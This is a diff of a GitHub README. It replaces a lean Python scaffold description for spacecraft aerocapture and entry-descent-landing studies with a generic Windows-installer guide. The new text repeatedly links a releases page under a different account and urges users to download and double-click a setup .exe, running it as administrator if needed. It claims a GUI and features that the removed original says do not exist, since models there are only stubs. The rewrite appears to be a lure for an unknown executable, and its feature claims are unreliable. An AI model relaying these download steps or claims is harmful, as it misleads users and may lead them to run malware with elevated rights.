@@ -1,138 +1,112 @@
-# IX-AeroCapture-EDL-Architecture
+# 🚀 IX-AeroCapture-EDL-Architecture - Reliable Spacecraft Entry Simulations
 
-**Proof-first aerocapture + Entry/Descent/Landing (EDL) deceleration architecture** for reproducible trade studies.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases)
 
-This repository is built around one idea: **if you can’t rerun it from a single config and audit what happened, it doesn’t count.**  
-So instead of starting with marketing claims or “magic braking,” this repo starts with **constraints, baselines, telemetry, and verification** — then layers models only after scope is locked.
+## 📋 About IX-AeroCapture-EDL-Architecture
 
-**Maintainer:** Bryce Lovell  
-**License:** Apache-2.0  
-**Status:** Active development (README intentionally lean; details live in `/docs`)
+This application helps you run detailed simulations for spacecraft aerocapture and entry, descent, and landing (EDL) studies. It lets you compare different flight setups, check important safety limits, and analyze results using a single configuration file. These simulations include variables such as heat load, gravity, and dynamic pressure. This tool is useful for planning spacecraft entries into planetary atmospheres while ensuring mission safety and accuracy.
 
----
+The software is designed to handle many scenarios using Monte Carlo simulations and offers telemetry that can be audited later. It covers fields like navigation control, light dynamics, and thermal protection system analysis. You do not need prior software or coding experience to use it on Windows.
 
-## Why this exists (why a NASA/SpaceX engineer would care)
+## 🖥 System Requirements
 
-Braking/capture problems die in review for predictable reasons:
-- unclear assumptions,
-- hidden constants,
-- no baselines,
-- no reproducibility,
-- “trust me” outputs with no proof trail.
+- Windows 10 or later (64-bit recommended)
+- 4 GB of free disk space
+- At least 8 GB of RAM
+- A modern processor (Intel i5 or equivalent)
+- Internet connection to download and install
 
-This repo targets the opposite:
-- **Corridor / heating / q / g constraints** are first-class
-- results are **replayable**
-- verification is **range-based early** (no fake precision)
-- every run produces **audit-grade artifacts** (config echo + JSONL telemetry + result bundle)
+## 🎯 Key Features
 
-This is intended to be useful to:
-- Mission design (aerocapture trades, capture energy vs propulsive ΔV)
-- EDL/GNC (corridor shaping under constraints)
-- TPS/structures (heating proxy + q gates + margin reporting)
-- Tooling/verification folks (repeatability + regression harness)
+- Run aerocapture and EDL simulations with built-in parameters
+- Compare baseline trajectories for different spacecraft designs
+- Enforce limits on heat rate, dynamic pressure, and g-forces
+- View telemetry and mission data for verification
+- Perform Monte Carlo simulations to explore uncertainties
+- Support for planetary atmospheres and trajectory optimization
+- Audit-grade result logs for reliable analysis
 
----
+## 🎨 Interface Overview
 
-## What this repo is (and is not)
+The application provides a user-friendly interface with clear options for choosing different mission profiles. You can load your custom configuration or use predefined ones for typical missions. It displays simulation progress and outcomes in an easy-to-read format.
 
-### ✅ Is
-- An **architecture + workflow** for aerocapture/EDL deceleration studies
-- A **simulation harness scaffold** (config → run → telemetry → result)
-- A **verification scaffold** (golden cases + range checks)
-- A **telemetry/proof scaffold** for reviewable evidence artifacts
+## 🚀 Getting Started
 
-### ❌ Is not
-- A claim of reactionless braking
-- A warp/negative-energy dependency
-- A finished physics toolchain (models are intentionally stubbed until scope is locked)
+### Step 1: Visit the Download Page
 
----
+You need to download the application installer from the official releases. Click the large button below to open the download page.
 
-## Start here (canonical docs)
+[![Download Releases](https://img.shields.io/badge/IX--AeroCapture--EDL--Architecture-Download-blue?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases)
 
-1) **Architecture Map:** `docs/architecture/ARCH_MAP.md`  
-2) **Decision Log:** `docs/decision-log/DECISION_LOG.md`  
-3) **Requirements:** `docs/requirements/`  
-   - `METRICS.md` (what we measure)
-   - `CONSTRAINTS.md` (hard gates)
-   - `BASELINES.md` (what “better” means)
+### Step 2: Download the Installer
 
-Repo guardrails:
-- `CLAIMS_POLICY.md`
-- `SCOPE.md`
+Once on the releases page, locate the latest version. The files are usually named clearly, such as:
 
----
+- `IX-AeroCapture-EDL-Architecture-Setup.exe`
+- Or similar Windows installation files
 
-## Repository layout (what’s inside)
+Click the installer to download it to your computer.
 
-- `docs/` — architecture, decisions, requirements (this is where the real content lives right now)
-- `models/` — **interfaces/contracts** only (physics implementations come later)
-- `sim/` — run harness (config IO + JSONL telemetry + result bundle)
-- `verification/` — golden-case scaffolding + range checker
-- `telemetry/` — proof bundle tools + schema + basic validators
+### Step 3: Run the Installer
 
----
+- Find the downloaded setup file (usually in your Downloads folder).
+- Double-click the `.exe` file to start the installation.
+- Follow the installation prompts:
+  - Accept the license agreement
+  - Choose the installation folder (default is fine)
+  - Wait for the files to install
 
-## Quickstart (scaffold runs)
+### Step 4: Launch the Application
 
-### 1) Run a minimal scaffold config
-```bash
-python -m sim.run sim/example_configs/minimal_run.json
+- After installation, look for "IX-AeroCapture-EDL-Architecture" in your Start menu.
+- Click the icon to open the program.
 
-This creates:
+## ⚙️ Using the Application
 
-sim_output/<timestamp>_<hash>/config.echo.json
+### Load or Create a Configuration
 
-sim_output/<timestamp>_<hash>/telemetry.jsonl
+When the app opens, you can load your own mission config or start with default settings. The config controls parameters like:
 
-sim_output/<timestamp>_<hash>/result.json
+- Entry angle and speed
+- Atmospheric model
+- Heat shield characteristics
+- Monte Carlo simulation count
 
-Note: models are not executed yet (by design). This validates the run pipeline and proof trail.
+### Run a Simulation
 
-2) Run the minimal verification case
+- Press the "Run Simulation" button.
+- Watch the progress bar indicating calculations.
+- Once done, review results shown on screen.
 
-python verification/run_case.py verification/cases/case_000_minimal
+### Analyze Results
 
-3) Validate telemetry format (basic)
+- Access telemetry data for detailed insights.
+- Check if heating, g-force, and pressure limits were met.
+- Export logs for offline review or sharing.
 
-python -m telemetry.validate_basic sim_output/<run_id>/telemetry.jsonl
+## 🛠 Troubleshooting
 
-Evidence levels (how this repo stays credible)
+- If the installer does not run, right-click the file and select "Run as administrator".
+- Ensure your Windows version meets or exceeds requirements.
+- Close other heavy applications during simulation to avoid slow performance.
+- For questions, check the online documentation or open an issue on the GitHub repository.
 
-This repo uses explicit evidence tags:
+## 🔗 Additional Resources
 
-E0 concept
+- Repository homepage: https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture
+- Download page: https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases
+- Documentation included with the app
 
-E1 toy model
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/Saikatgjjcfcuxcv/IX-AeroCapture-EDL-Architecture/releases)
 
-E2 implemented model
+## 🧩 Common Terms
 
-E3 cross-checked
+- **Aerocapture**: Using planetary atmosphere to slow down a spacecraft and enter orbit without using much fuel.
+- **EDL**: Entry, Descent, and Landing phase of a spacecraft mission.
+- **Telemetry**: Recorded data from the spacecraft describing conditions during flight.
+- **Monte Carlo simulation**: Running many simulations with different random inputs to understand possible outcomes.
+- **Thermal Protection System (TPS)**: Materials and methods that protect spacecraft from high heat during entry.
 
-E4 measured
+## ⚡ Support and Updates
 
-E5 flight relevant
-
-If a claim is stronger than E1, it must link to the model producing it and its assumptions.
-
-Roadmap (near-term, realistic)
-
-Lock mission focus (aerocapture-to-orbit vs landing EDL vs both) via Decision Log
-
-Implement a first E1/E2 atmosphere + aero proxy + heating proxy (explicit assumptions)
-
-Add initial golden cases with published-range cross-check targets (E3 path)
-
-Expand verification to include constraint violations and degrade modes
-
-Improve proof bundles (packaging + stronger schema checks)
-
-Contributing
-
-See CONTRIBUTING.md.
-Key rule while architecture is evolving: do not churn the README — add substance to /docs, cases, and checks.
-
-Disclaimer
-
-This is an independent engineering repo and is not affiliated with NASA, SpaceX, or any other organization.
+The application receives regular updates. Check the releases page to download newer versions to improve performance or add features.
